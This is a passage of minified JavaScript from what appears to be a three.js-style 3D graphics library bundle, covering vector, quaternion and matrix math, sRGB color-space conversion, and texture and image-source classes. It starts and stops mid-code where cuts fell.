this.y=e,this}setComponent(e,n){switch(e){case 0:this.x=n;break;case 1:this.y=n;break;default:throw new Error("index is out of range: "+e)}return this}getComponent(e){switch(e){case 0:return this.x;case 1:return this.y;default:throw new Error("index is out of range: "+e)}}clone(){return new this.constructor(this.x,this.y)}copy(e){return this.x=e.x,this.y=e.y,this}add(e){return this.x+=e.x,this.y+=e.y,this}addScalar(e){return this.x+=e,this.y+=e,this}addVectors(e,n){return this.x=e.x+n.x,this.y=e.y+n.y,this}addScaledVector(e,n){return this.x+=e.x*n,this.y+=e.y*n,this}sub(e){return this.x-=e.x,this.y-=e.y,this}subScalar(e){return this.x-=e,this.y-=e,this}subVectors(e,n){return this.x=e.x-n.x,this.y=e.y-n.y,this}multiply(e){return this.x*=e.x,this.y*=e.y,this}multiplyScalar(e){return this.x*=e,this.y*=e,this}divide(e){return this.x/=e.x,this.y/=e.y,this}divideScalar(e){return this.multiplyScalar(1/e)}applyMatrix3(e){const n=this.x,i=this.y,s=e.elements;return this.x=s[0]*n+s[3]*i+s[6],this.y=s[1]*n+s[4]*i+s[7],this}min(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this}max(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this}clamp(e,n){return this.x=He(this.x,e.x,n.x),this.y=He(this.y,e.y,n.y),this}clampScalar(e,n){return this.x=He(this.x,e,n),this.y=He(this.y,e,n),this}clampLength(e,n){const i=this.length();return this.divideScalar(i||1).multiplyScalar(He(i,e,n))}floor(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this}ceil(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this}round(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this}roundToZero(){return this.x=Math.trunc(this.x),this.y=Math.trunc(this.y),this}negate(){return this.x=-this.x,this.y=-this.y,this}dot(e){return this.x*e.x+this.y*e.y}cross(e){return this.x*e.y-this.y*e.x}lengthSq(){return this.x*this.x+this.y*this.y}length(){return Math.sqrt(this.x*this.x+this.y*this.y)}manhattanLength(){return Math.abs(this.x)+Math.abs(this.y)}normalize(){return this.divideScalar(this.length()||1)}angle(){return Math.atan2(-this.y,-this.x)+Math.PI}angleTo(e){const n=Math.sqrt(this.lengthSq()*e.lengthSq());if(n===0)return Math.PI/2;const i=this.dot(e)/n;return Math.acos(He(i,-1,1))}distanceTo(e){return Math.sqrt(this.distanceToSquared(e))}distanceToSquared(e){const n=this.x-e.x,i=this.y-e.y;return n*n+i*i}manhattanDistanceTo(e){return Math.abs(this.x-e.x)+Math.abs(this.y-e.y)}setLength(e){return this.normalize().multiplyScalar(e)}lerp(e,n){return this.x+=(e.x-this.x)*n,this.y+=(e.y-this.y)*n,this}lerpVectors(e,n,i){return this.x=e.x+(n.x-e.x)*i,this.y=e.y+(n.y-e.y)*i,this}equals(e){return e.x===this.x&&e.y===this.y}fromArray(e,n=0){return this.x=e[n],this.y=e[n+1],this}toArray(e=[],n=0){return e[n]=this.x,e[n+1]=this.y,e}fromBufferAttribute(e,n){return this.x=e.getX(n),this.y=e.getY(n),this}rotateAround(e,n){const i=Math.cos(n),s=Math.sin(n),r=this.x-e.x,a=this.y-e.y;return this.x=r*i-a*s+e.x,this.y=r*s+a*i+e.y,this}random(){return this.x=Math.random(),this.y=Math.random(),this}*[Symbol.iterator](){yield this.x,yield this.y}}class eo{constructor(e=0,n=0,i=0,s=1){this.isQuaternion=!0,this._x=e,this._y=n,this._z=i,this._w=s}static slerpFlat(e,n,i,s,r,a,o){let l=i[s+0],c=i[s+1],p=i[s+2],d=i[s+3],h=r[a+0],f=r[a+1],v=r[a+2],y=r[a+3];if(o<=0){e[n+0]=l,e[n+1]=c,e[n+2]=p,e[n+3]=d;return}if(o>=1){e[n+0]=h,e[n+1]=f,e[n+2]=v,e[n+3]=y;return}if(d!==y||l!==h||c!==f||p!==v){let m=l*h+c*f+p*v+d*y;m<0&&(h=-h,f=-f,v=-v,y=-y,m=-m);let u=1-o;if(m<.9995){const g=Math.acos(m),_=Math.sin(g);u=Math.sin(u*g)/_,o=Math.sin(o*g)/_,l=l*u+h*o,c=c*u+f*o,p=p*u+v*o,d=d*u+y*o}else{l=l*u+h*o,c=c*u+f*o,p=p*u+v*o,d=d*u+y*o;const g=1/Math.sqrt(l*l+c*c+p*p+d*d);l*=g,c*=g,p*=g,d*=g}}e[n]=l,e[n+1]=c,e[n+2]=p,e[n+3]=d}static multiplyQuaternionsFlat(e,n,i,s,r,a){const o=i[s],l=i[s+1],c=i[s+2],p=i[s+3],d=r[a],h=r[a+1],f=r[a+2],v=r[a+3];return e[n]=o*v+p*d+l*f-c*h,e[n+1]=l*v+p*h+c*d-o*f,e[n+2]=c*v+p*f+o*h-l*d,e[n+3]=p*v-o*d-l*h-c*f,e}get x(){return this._x}set x(e){this._x=e,this._onChangeCallback()}get y(){return this._y}set y(e){this._y=e,this._onChangeCallback()}get z(){return this._z}set z(e){this._z=e,this._onChangeCallback()}get w(){return this._w}set w(e){this._w=e,this._onChangeCallback()}set(e,n,i,s){return this._x=e,this._y=n,this._z=i,this._w=s,this._onChangeCallback(),this}clone(){return new this.constructor(this._x,this._y,this._z,this._w)}copy(e){return this._x=e.x,this._y=e.y,this._z=e.z,this._w=e.w,this._onChangeCallback(),this}setFromEuler(e,n=!0){const i=e._x,s=e._y,r=e._z,a=e._order,o=Math.cos,l=Math.sin,c=o(i/2),p=o(s/2),d=o(r/2),h=l(i/2),f=l(s/2),v=l(r/2);switch(a){case"XYZ":this._x=h*p*d+c*f*v,this._y=c*f*d-h*p*v,this._z=c*p*v+h*f*d,this._w=c*p*d-h*f*v;break;case"YXZ":this._x=h*p*d+c*f*v,this._y=c*f*d-h*p*v,this._z=c*p*v-h*f*d,this._w=c*p*d+h*f*v;break;case"ZXY":this._x=h*p*d-c*f*v,this._y=c*f*d+h*p*v,this._z=c*p*v+h*f*d,this._w=c*p*d-h*f*v;break;case"ZYX":this._x=h*p*d-c*f*v,this._y=c*f*d+h*p*v,this._z=c*p*v-h*f*d,this._w=c*p*d+h*f*v;break;case"YZX":this._x=h*p*d+c*f*v,this._y=c*f*d+h*p*v,this._z=c*p*v-h*f*d,this._w=c*p*d-h*f*v;break;case"XZY":this._x=h*p*d-c*f*v,this._y=c*f*d-h*p*v,this._z=c*p*v+h*f*d,this._w=c*p*d+h*f*v;break;default:Ie("Quaternion: .setFromEuler() encountered an unknown order: "+a)}return n===!0&&this._onChangeCallback(),this}setFromAxisAngle(e,n){const i=n/2,s=Math.sin(i);return this._x=e.x*s,this._y=e.y*s,this._z=e.z*s,this._w=Math.cos(i),this._onChangeCallback(),this}setFromRotationMatrix(e){const n=e.elements,i=n[0],s=n[4],r=n[8],a=n[1],o=n[5],l=n[9],c=n[2],p=n[6],d=n[10],h=i+o+d;if(h>0){const f=.5/Math.sqrt(h+1);this._w=.25/f,this._x=(p-l)*f,this._y=(r-c)*f,this._z=(a-s)*f}else if(i>o&&i>d){const f=2*Math.sqrt(1+i-o-d);this._w=(p-l)/f,this._x=.25*f,this._y=(s+a)/f,this._z=(r+c)/f}else if(o>d){const f=2*Math.sqrt(1+o-i-d);this._w=(r-c)/f,this._x=(s+a)/f,this._y=.25*f,this._z=(l+p)/f}else{const f=2*Math.sqrt(1+d-i-o);this._w=(a-s)/f,this._x=(r+c)/f,this._y=(l+p)/f,this._z=.25*f}return this._onChangeCallback(),this}setFromUnitVectors(e,n){let i=e.dot(n)+1;return i<1e-8?(i=0,Math.abs(e.x)>Math.abs(e.z)?(this._x=-e.y,this._y=e.x,this._z=0,this._w=i):(this._x=0,this._y=-e.z,this._z=e.y,this._w=i)):(this._x=e.y*n.z-e.z*n.y,this._y=e.z*n.x-e.x*n.z,this._z=e.x*n.y-e.y*n.x,this._w=i),this.normalize()}angleTo(e){return 2*Math.acos(Math.abs(He(this.dot(e),-1,1)))}rotateTowards(e,n){const i=this.angleTo(e);if(i===0)return this;const s=Math.min(1,n/i);return this.slerp(e,s),this}identity(){return this.set(0,0,0,1)}invert(){return this.conjugate()}conjugate(){return this._x*=-1,this._y*=-1,this._z*=-1,this._onChangeCallback(),this}dot(e){return this._x*e._x+this._y*e._y+this._z*e._z+this._w*e._w}lengthSq(){return this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w}length(){return Math.sqrt(this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w)}normalize(){let e=this.length();return e===0?(this._x=0,this._y=0,this._z=0,this._w=1):(e=1/e,this._x=this._x*e,this._y=this._y*e,this._z=this._z*e,this._w=this._w*e),this._onChangeCallback(),this}multiply(e){return this.multiplyQuaternions(this,e)}premultiply(e){return this.multiplyQuaternions(e,this)}multiplyQuaternions(e,n){const i=e._x,s=e._y,r=e._z,a=e._w,o=n._x,l=n._y,c=n._z,p=n._w;return this._x=i*p+a*o+s*c-r*l,this._y=s*p+a*l+r*o-i*c,this._z=r*p+a*c+i*l-s*o,this._w=a*p-i*o-s*l-r*c,this._onChangeCallback(),this}slerp(e,n){if(n<=0)return this;if(n>=1)return this.copy(e);let i=e._x,s=e._y,r=e._z,a=e._w,o=this.dot(e);o<0&&(i=-i,s=-s,r=-r,a=-a,o=-o);let l=1-n;if(o<.9995){const c=Math.acos(o),p=Math.sin(c);l=Math.sin(l*c)/p,n=Math.sin(n*c)/p,this._x=this._x*l+i*n,this._y=this._y*l+s*n,this._z=this._z*l+r*n,this._w=this._w*l+a*n,this._onChangeCallback()}else this._x=this._x*l+i*n,this._y=this._y*l+s*n,this._z=this._z*l+r*n,this._w=this._w*l+a*n,this.normalize();return this}slerpQuaternions(e,n,i){return this.copy(e).slerp(n,i)}random(){const e=2*Math.PI*Math.random(),n=2*Math.PI*Math.random(),i=Math.random(),s=Math.sqrt(1-i),r=Math.sqrt(i);return this.set(s*Math.sin(e),s*Math.cos(e),r*Math.sin(n),r*Math.cos(n))}equals(e){return e._x===this._x&&e._y===this._y&&e._z===this._z&&e._w===this._w}fromArray(e,n=0){return this._x=e[n],this._y=e[n+1],this._z=e[n+2],this._w=e[n+3],this._onChangeCallback(),this}toArray(e=[],n=0){return e[n]=this._x,e[n+1]=this._y,e[n+2]=this._z,e[n+3]=this._w,e}fromBufferAttribute(e,n){return this._x=e.getX(n),this._y=e.getY(n),this._z=e.getZ(n),this._w=e.getW(n),this._onChangeCallback(),this}toJSON(){return this.toArray()}_onChange(e){return this._onChangeCallback=e,this}_onChangeCallback(){}*[Symbol.iterator](){yield this._x,yield this._y,yield this._z,yield this._w}}class H{constructor(e=0,n=0,i=0){H.prototype.isVector3=!0,this.x=e,this.y=n,this.z=i}set(e,n,i){return i===void 0&&(i=this.z),this.x=e,this.y=n,this.z=i,this}setScalar(e){return this.x=e,this.y=e,this.z=e,this}setX(e){return this.x=e,this}setY(e){return this.y=e,this}setZ(e){return this.z=e,this}setComponent(e,n){switch(e){case 0:this.x=n;break;case 1:this.y=n;break;case 2:this.z=n;break;default:throw new Error("index is out of range: "+e)}return this}getComponent(e){switch(e){case 0:return this.x;case 1:return this.y;case 2:return this.z;default:throw new Error("index is out of range: "+e)}}clone(){return new this.constructor(this.x,this.y,this.z)}copy(e){return this.x=e.x,this.y=e.y,this.z=e.z,this}add(e){return this.x+=e.x,this.y+=e.y,this.z+=e.z,this}addScalar(e){return this.x+=e,this.y+=e,this.z+=e,this}addVectors(e,n){return this.x=e.x+n.x,this.y=e.y+n.y,this.z=e.z+n.z,this}addScaledVector(e,n){return this.x+=e.x*n,this.y+=e.y*n,this.z+=e.z*n,this}sub(e){return this.x-=e.x,this.y-=e.y,this.z-=e.z,this}subScalar(e){return this.x-=e,this.y-=e,this.z-=e,this}subVectors(e,n){return this.x=e.x-n.x,this.y=e.y-n.y,this.z=e.z-n.z,this}multiply(e){return this.x*=e.x,this.y*=e.y,this.z*=e.z,this}multiplyScalar(e){return this.x*=e,this.y*=e,this.z*=e,this}multiplyVectors(e,n){return this.x=e.x*n.x,this.y=e.y*n.y,this.z=e.z*n.z,this}applyEuler(e){return this.applyQuaternion(tm.setFromEuler(e))}applyAxisAngle(e,n){return this.applyQuaternion(tm.setFromAxisAngle(e,n))}applyMatrix3(e){const n=this.x,i=this.y,s=this.z,r=e.elements;return this.x=r[0]*n+r[3]*i+r[6]*s,this.y=r[1]*n+r[4]*i+r[7]*s,this.z=r[2]*n+r[5]*i+r[8]*s,this}applyNormalMatrix(e){return this.applyMatrix3(e).normalize()}applyMatrix4(e){const n=this.x,i=this.y,s=this.z,r=e.elements,a=1/(r[3]*n+r[7]*i+r[11]*s+r[15]);return this.x=(r[0]*n+r[4]*i+r[8]*s+r[12])*a,this.y=(r[1]*n+r[5]*i+r[9]*s+r[13])*a,this.z=(r[2]*n+r[6]*i+r[10]*s+r[14])*a,this}applyQuaternion(e){const n=this.x,i=this.y,s=this.z,r=e.x,a=e.y,o=e.z,l=e.w,c=2*(a*s-o*i),p=2*(o*n-r*s),d=2*(r*i-a*n);return this.x=n+l*c+a*d-o*p,this.y=i+l*p+o*c-r*d,this.z=s+l*d+r*p-a*c,this}project(e){return this.applyMatrix4(e.matrixWorldInverse).applyMatrix4(e.projectionMatrix)}unproject(e){return this.applyMatrix4(e.projectionMatrixInverse).applyMatrix4(e.matrixWorld)}transformDirection(e){const n=this.x,i=this.y,s=this.z,r=e.elements;return this.x=r[0]*n+r[4]*i+r[8]*s,this.y=r[1]*n+r[5]*i+r[9]*s,this.z=r[2]*n+r[6]*i+r[10]*s,this.normalize()}divide(e){return this.x/=e.x,this.y/=e.y,this.z/=e.z,this}divideScalar(e){return this.multiplyScalar(1/e)}min(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this.z=Math.min(this.z,e.z),this}max(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this.z=Math.max(this.z,e.z),this}clamp(e,n){return this.x=He(this.x,e.x,n.x),this.y=He(this.y,e.y,n.y),this.z=He(this.z,e.z,n.z),this}clampScalar(e,n){return this.x=He(this.x,e,n),this.y=He(this.y,e,n),this.z=He(this.z,e,n),this}clampLength(e,n){const i=this.length();return this.divideScalar(i||1).multiplyScalar(He(i,e,n))}floor(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this}ceil(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this}round(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this}roundToZero(){return this.x=Math.trunc(this.x),this.y=Math.trunc(this.y),this.z=Math.trunc(this.z),this}negate(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this}dot(e){return this.x*e.x+this.y*e.y+this.z*e.z}lengthSq(){return this.x*this.x+this.y*this.y+this.z*this.z}length(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)}manhattanLength(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)}normalize(){return this.divideScalar(this.length()||1)}setLength(e){return this.normalize().multiplyScalar(e)}lerp(e,n){return this.x+=(e.x-this.x)*n,this.y+=(e.y-this.y)*n,this.z+=(e.z-this.z)*n,this}lerpVectors(e,n,i){return this.x=e.x+(n.x-e.x)*i,this.y=e.y+(n.y-e.y)*i,this.z=e.z+(n.z-e.z)*i,this}cross(e){return this.crossVectors(this,e)}crossVectors(e,n){const i=e.x,s=e.y,r=e.z,a=n.x,o=n.y,l=n.z;return this.x=s*l-r*o,this.y=r*a-i*l,this.z=i*o-s*a,this}projectOnVector(e){const n=e.lengthSq();if(n===0)return this.set(0,0,0);const i=e.dot(this)/n;return this.copy(e).multiplyScalar(i)}projectOnPlane(e){return Fc.copy(this).projectOnVector(e),this.sub(Fc)}reflect(e){return this.sub(Fc.copy(e).multiplyScalar(2*this.dot(e)))}angleTo(e){const n=Math.sqrt(this.lengthSq()*e.lengthSq());if(n===0)return Math.PI/2;const i=this.dot(e)/n;return Math.acos(He(i,-1,1))}distanceTo(e){return Math.sqrt(this.distanceToSquared(e))}distanceToSquared(e){const n=this.x-e.x,i=this.y-e.y,s=this.z-e.z;return n*n+i*i+s*s}manhattanDistanceTo(e){return Math.abs(this.x-e.x)+Math.abs(this.y-e.y)+Math.abs(this.z-e.z)}setFromSpherical(e){return this.setFromSphericalCoords(e.radius,e.phi,e.theta)}setFromSphericalCoords(e,n,i){const s=Math.sin(n)*e;return this.x=s*Math.sin(i),this.y=Math.cos(n)*e,this.z=s*Math.cos(i),this}setFromCylindrical(e){return this.setFromCylindricalCoords(e.radius,e.theta,e.y)}setFromCylindricalCoords(e,n,i){return this.x=e*Math.sin(n),this.y=i,this.z=e*Math.cos(n),this}setFromMatrixPosition(e){const n=e.elements;return this.x=n[12],this.y=n[13],this.z=n[14],this}setFromMatrixScale(e){const n=this.setFromMatrixColumn(e,0).length(),i=this.setFromMatrixColumn(e,1).length(),s=this.setFromMatrixColumn(e,2).length();return this.x=n,this.y=i,this.z=s,this}setFromMatrixColumn(e,n){return this.fromArray(e.elements,n*4)}setFromMatrix3Column(e,n){return this.fromArray(e.elements,n*3)}setFromEuler(e){return this.x=e._x,this.y=e._y,this.z=e._z,this}setFromColor(e){return this.x=e.r,this.y=e.g,this.z=e.b,this}equals(e){return e.x===this.x&&e.y===this.y&&e.z===this.z}fromArray(e,n=0){return this.x=e[n],this.y=e[n+1],this.z=e[n+2],this}toArray(e=[],n=0){return e[n]=this.x,e[n+1]=this.y,e[n+2]=this.z,e}fromBufferAttribute(e,n){return this.x=e.getX(n),this.y=e.getY(n),this.z=e.getZ(n),this}random(){return this.x=Math.random(),this.y=Math.random(),this.z=Math.random(),this}randomDirection(){const e=Math.random()*Math.PI*2,n=Math.random()*2-1,i=Math.sqrt(1-n*n);return this.x=i*Math.cos(e),this.y=n,this.z=i*Math.sin(e),this}*[Symbol.iterator](){yield this.x,yield this.y,yield this.z}}const Fc=new H,tm=new eo;class Ue{constructor(e,n,i,s,r,a,o,l,c){Ue.prototype.isMatrix3=!0,this.elements=[1,0,0,0,1,0,0,0,1],e!==void 0&&this.set(e,n,i,s,r,a,o,l,c)}set(e,n,i,s,r,a,o,l,c){const p=this.elements;return p[0]=e,p[1]=s,p[2]=o,p[3]=n,p[4]=r,p[5]=l,p[6]=i,p[7]=a,p[8]=c,this}identity(){return this.set(1,0,0,0,1,0,0,0,1),this}copy(e){const n=this.elements,i=e.elements;return n[0]=i[0],n[1]=i[1],n[2]=i[2],n[3]=i[3],n[4]=i[4],n[5]=i[5],n[6]=i[6],n[7]=i[7],n[8]=i[8],this}extractBasis(e,n,i){return e.setFromMatrix3Column(this,0),n.setFromMatrix3Column(this,1),i.setFromMatrix3Column(this,2),this}setFromMatrix4(e){const n=e.elements;return this.set(n[0],n[4],n[8],n[1],n[5],n[9],n[2],n[6],n[10]),this}multiply(e){return this.multiplyMatrices(this,e)}premultiply(e){return this.multiplyMatrices(e,this)}multiplyMatrices(e,n){const i=e.elements,s=n.elements,r=this.elements,a=i[0],o=i[3],l=i[6],c=i[1],p=i[4],d=i[7],h=i[2],f=i[5],v=i[8],y=s[0],m=s[3],u=s[6],g=s[1],_=s[4],b=s[7],T=s[2],A=s[5],C=s[8];return r[0]=a*y+o*g+l*T,r[3]=a*m+o*_+l*A,r[6]=a*u+o*b+l*C,r[1]=c*y+p*g+d*T,r[4]=c*m+p*_+d*A,r[7]=c*u+p*b+d*C,r[2]=h*y+f*g+v*T,r[5]=h*m+f*_+v*A,r[8]=h*u+f*b+v*C,this}multiplyScalar(e){const n=this.elements;return n[0]*=e,n[3]*=e,n[6]*=e,n[1]*=e,n[4]*=e,n[7]*=e,n[2]*=e,n[5]*=e,n[8]*=e,this}determinant(){const e=this.elements,n=e[0],i=e[1],s=e[2],r=e[3],a=e[4],o=e[5],l=e[6],c=e[7],p=e[8];return n*a*p-n*o*c-i*r*p+i*o*l+s*r*c-s*a*l}invert(){const e=this.elements,n=e[0],i=e[1],s=e[2],r=e[3],a=e[4],o=e[5],l=e[6],c=e[7],p=e[8],d=p*a-o*c,h=o*l-p*r,f=c*r-a*l,v=n*d+i*h+s*f;if(v===0)return this.set(0,0,0,0,0,0,0,0,0);const y=1/v;return e[0]=d*y,e[1]=(s*c-p*i)*y,e[2]=(o*i-s*a)*y,e[3]=h*y,e[4]=(p*n-s*l)*y,e[5]=(s*r-o*n)*y,e[6]=f*y,e[7]=(i*l-c*n)*y,e[8]=(a*n-i*r)*y,this}transpose(){let e;const n=this.elements;return e=n[1],n[1]=n[3],n[3]=e,e=n[2],n[2]=n[6],n[6]=e,e=n[5],n[5]=n[7],n[7]=e,this}getNormalMatrix(e){return this.setFromMatrix4(e).invert().transpose()}transposeIntoArray(e){const n=this.elements;return e[0]=n[0],e[1]=n[3],e[2]=n[6],e[3]=n[1],e[4]=n[4],e[5]=n[7],e[6]=n[2],e[7]=n[5],e[8]=n[8],this}setUvTransform(e,n,i,s,r,a,o){const l=Math.cos(r),c=Math.sin(r);return this.set(i*l,i*c,-i*(l*a+c*o)+a+e,-s*c,s*l,-s*(-c*a+l*o)+o+n,0,0,1),this}scale(e,n){return this.premultiply(Bc.makeScale(e,n)),this}rotate(e){return this.premultiply(Bc.makeRotation(-e)),this}translate(e,n){return this.premultiply(Bc.makeTranslation(e,n)),this}makeTranslation(e,n){return e.isVector2?this.set(1,0,e.x,0,1,e.y,0,0,1):this.set(1,0,e,0,1,n,0,0,1),this}makeRotation(e){const n=Math.cos(e),i=Math.sin(e);return this.set(n,-i,0,i,n,0,0,0,1),this}makeScale(e,n){return this.set(e,0,0,0,n,0,0,0,1),this}equals(e){const n=this.elements,i=e.elements;for(let s=0;s<9;s++)if(n[s]!==i[s])return!1;return!0}fromArray(e,n=0){for(let i=0;i<9;i++)this.elements[i]=e[i+n];return this}toArray(e=[],n=0){const i=this.elements;return e[n]=i[0],e[n+1]=i[1],e[n+2]=i[2],e[n+3]=i[3],e[n+4]=i[4],e[n+5]=i[5],e[n+6]=i[6],e[n+7]=i[7],e[n+8]=i[8],e}clone(){return new this.constructor().fromArray(this.elements)}}const Bc=new Ue,nm=new Ue().set(.4123908,.3575843,.1804808,.212639,.7151687,.0721923,.0193308,.1191948,.9505322),im=new Ue().set(3.2409699,-1.5373832,-.4986108,-.9692436,1.8759675,.0415551,.0556301,-.203977,1.0569715);function fw(){const t={enabled:!0,workingColorSpace:Dr,spaces:{},convert:function(s,r,a){return this.enabled===!1||r===a||!r||!a||(this.spaces[r].transfer===it&&(s.r=Ti(s.r),s.g=Ti(s.g),s.b=Ti(s.b)),this.spaces[r].primaries!==this.spaces[a].primaries&&(s.applyMatrix3(this.spaces[r].toXYZ),s.applyMatrix3(this.spaces[a].fromXYZ)),this.spaces[a].transfer===it&&(s.r=Er(s.r),s.g=Er(s.g),s.b=Er(s.b))),s},workingToColorSpace:function(s,r){return this.convert(s,this.workingColorSpace,r)},colorSpaceToWorking:function(s,r){return this.convert(s,r,this.workingColorSpace)},getPrimaries:function(s){return this.spaces[s].primaries},getTransfer:function(s){return s===Xi?Nl:this.spaces[s].transfer},getToneMappingMode:function(s){return this.spaces[s].outputColorSpaceConfig.toneMappingMode||"standard"},getLuminanceCoefficients:function(s,r=this.workingColorSpace){return s.fromArray(this.spaces[r].luminanceCoefficients)},define:function(s){Object.assign(this.spaces,s)},_getMatrix:function(s,r,a){return s.copy(this.spaces[r].toXYZ).multiply(this.spaces[a].fromXYZ)},_getDrawingBufferColorSpace:function(s){return this.spaces[s].outputColorSpaceConfig.drawingBufferColorSpace},_getUnpackColorSpace:function(s=this.workingColorSpace){return this.spaces[s].workingColorSpaceConfig.unpackColorSpace},fromWorkingColorSpace:function(s,r){return Wa("ColorManagement: .fromWorkingColorSpace() has been renamed to .workingToColorSpace()."),t.workingToColorSpace(s,r)},toWorkingColorSpace:function(s,r){return Wa("ColorManagement: .toWorkingColorSpace() has been renamed to .colorSpaceToWorking()."),t.colorSpaceToWorking(s,r)}},e=[.64,.33,.3,.6,.15,.06],n=[.2126,.7152,.0722],i=[.3127,.329];return t.define({[Dr]:{primaries:e,whitePoint:i,transfer:Nl,toXYZ:nm,fromXYZ:im,luminanceCoefficients:n,workingColorSpaceConfig:{unpackColorSpace:Cn},outputColorSpaceConfig:{drawingBufferColorSpace:Cn}},[Cn]:{primaries:e,whitePoint:i,transfer:it,toXYZ:nm,fromXYZ:im,luminanceCoefficients:n,outputColorSpaceConfig:{drawingBufferColorSpace:Cn}}}),t}const We=fw();function Ti(t){return t<.04045?t*.0773993808:Math.pow(t*.9478672986+.0521327014,2.4)}function Er(t){return t<.0031308?t*12.92:1.055*Math.pow(t,.41666)-.055}let js;class mw{static getDataURL(e,n="image/png"){if(/^data:/i.test(e.src)||typeof HTMLCanvasElement>"u")return e.src;let i;if(e instanceof HTMLCanvasElement)i=e;else{js===void 0&&(js=Dl("canvas")),js.width=e.width,js.height=e.height;const s=js.getContext("2d");e instanceof ImageData?s.putImageData(e,0,0):s.drawImage(e,0,0,e.width,e.height),i=js}return i.toDataURL(n)}static sRGBToLinear(e){if(typeof HTMLImageElement<"u"&&e instanceof HTMLImageElement||typeof HTMLCanvasElement<"u"&&e instanceof HTMLCanvasElement||typeof ImageBitmap<"u"&&e instanceof ImageBitmap){const n=Dl("canvas");n.width=e.width,n.height=e.height;const i=n.getContext("2d");i.drawImage(e,0,0,e.width,e.height);const s=i.getImageData(0,0,e.width,e.height),r=s.data;for(let a=0;a<r.length;a++)r[a]=Ti(r[a]/255)*255;return i.putImageData(s,0,0),n}else if(e.data){const n=e.data.slice(0);for(let i=0;i<n.length;i++)n instanceof Uint8Array||n instanceof Uint8ClampedArray?n[i]=Math.floor(Ti(n[i]/255)*255):n[i]=Ti(n[i]);return{data:n,width:e.width,height:e.height}}else return Ie("ImageUtils.sRGBToLinear(): Unsupported image type. No color space conversion applied."),e}}let gw=0;class lh{constructor(e=null){this.isSource=!0,Object.defineProperty(this,"id",{value:gw++}),this.uuid=Qa(),this.data=e,this.dataReady=!0,this.version=0}getSize(e){const n=this.data;return typeof HTMLVideoElement<"u"&&n instanceof HTMLVideoElement?e.set(n.videoWidth,n.videoHeight,0):typeof VideoFrame<"u"&&n instanceof VideoFrame?e.set(n.displayHeight,n.displayWidth,0):n!==null?e.set(n.width,n.height,n.depth||0):e.set(0,0,0),e}set needsUpdate(e){e===!0&&this.version++}toJSON(e){const n=e===void 0||typeof e=="string";if(!n&&e.images[this.uuid]!==void 0)return e.images[this.uuid];const i={uuid:this.uuid,url:""},s=this.data;if(s!==null){let r;if(Array.isArray(s)){r=[];for(let a=0,o=s.length;a<o;a++)s[a].isDataTexture?r.push(zc(s[a].image)):r.push(zc(s[a]))}else r=zc(s);i.url=r}return n||(e.images[this.uuid]=i),i}}function zc(t){return typeof HTMLImageElement<"u"&&t instanceof HTMLImageElement||typeof HTMLCanvasElement<"u"&&t instanceof HTMLCanvasElement||typeof ImageBitmap<"u"&&t instanceof ImageBitmap?mw.getDataURL(t):t.data?{data:Array.from(t.data),width:t.width,height:t.height,type:t.data.constructor.name}:(Ie("Texture: Unable to serialize Texture."),{})}let vw=0;const Vc=new H;class Yt extends Vr{constructor(e=Yt.DEFAULT_IMAGE,n=Yt.DEFAULT_MAPPING,i=wi,s=wi,r=qt,a=Rs,o=jn,l=yn,c=Yt.DEFAULT_ANISOTROPY,p=Xi){super(),this.isTexture=!0,Object.defineProperty(this,"id",{value:vw++}),this.uuid=Qa(),this.name="",this.source=new lh(e),this.mipmaps=[],this.mapping=n,this.channel=0,this.wrapS=i,this.wrapT=s,this.magFilter=r,this.minFilter=a,this.anisotropy=c,this.format=o,this.internalFormat=null,this.type=l,this.offset=new Ze(0,0),this.repeat=new Ze(1,1),this.center=new Ze(0,0),this.rotation=0,this.matrixAutoUpdate=!0,this.matrix=new Ue,this.generateMipmaps=!0,this.premultiplyAlpha=!1,this.flipY=!0,this.unpackAlignment=4,this.colorSpace=p,this.userData={},this.updateRanges=[],this.version=0,this.onUpdate=null,this.renderTarget=null,this.isRenderTargetTexture=!1,this.isArrayTexture=!!(e&&e.depth&&e.depth>1),this.pmremVersion=0}get width(){return this.source.getSize(Vc).x}get height(){return this.source.getSize(Vc).y}get depth(){return this.source.getSize(Vc).z}get image(){return this.source.data}set image(e=null){this.source.data=e}updateMatrix(){this.matrix.setUvTransform(this.offset.x,this.offset.y,this.repeat.x,this.repeat.y,this.rotation,this.center.x,this.center.y)}addUpdateRange(e,n){this.updateRanges.push({start:e,count:n})}clearUpdateRanges(){this.updateRanges.length=0}clone(){return new this.constructor().copy(this)}copy(e){return this.name=e.name,this.source=e.source,this.mipmaps=e.mipmaps.slice(0),this.mapping=e.mapping,this.channel=e.channel,this.wrapS=e.wrapS,this.wrapT=e.wrapT,this.magFilter=e.magFilter,this.minFilter=e.minFilter,this.anisotropy=e.anisotropy,this.format=e.format,this.internalFormat=e.internalFormat,this.type=e.type,this.offset.copy(e.offset),this.repeat.copy(e.repeat),this.center.copy(e.center),this.rotation=e.rotation,this.matrixAutoUpdate=e.matrixAutoUpdate,this.matrix.copy(e.matrix),this.generateMipmaps=e.generateMipmaps,this.premultiplyAlpha=e.premultiplyAlpha,this.flipY=e.flipY,this.unpackAlignment=e.unpackAlignment,this.colorSpace=e.colorSpace,this.renderTarget=e.renderTarget,this.isRenderTargetTexture=e.isRenderTargetTexture,this.isArrayTexture=e.isArrayTexture,this.userData=JSON.parse(JSON.stringify(e.userData)),this.needsUpdate=!0,this}setValues(e){for(const n in e){const i=e[n];if(i===void 0){Ie(`Texture.setValues(): parameter '${n}' has value of undefined.`);continue}const s=this[n];if(s===void 0){Ie(`Texture.setValues(): property '${n}' does not 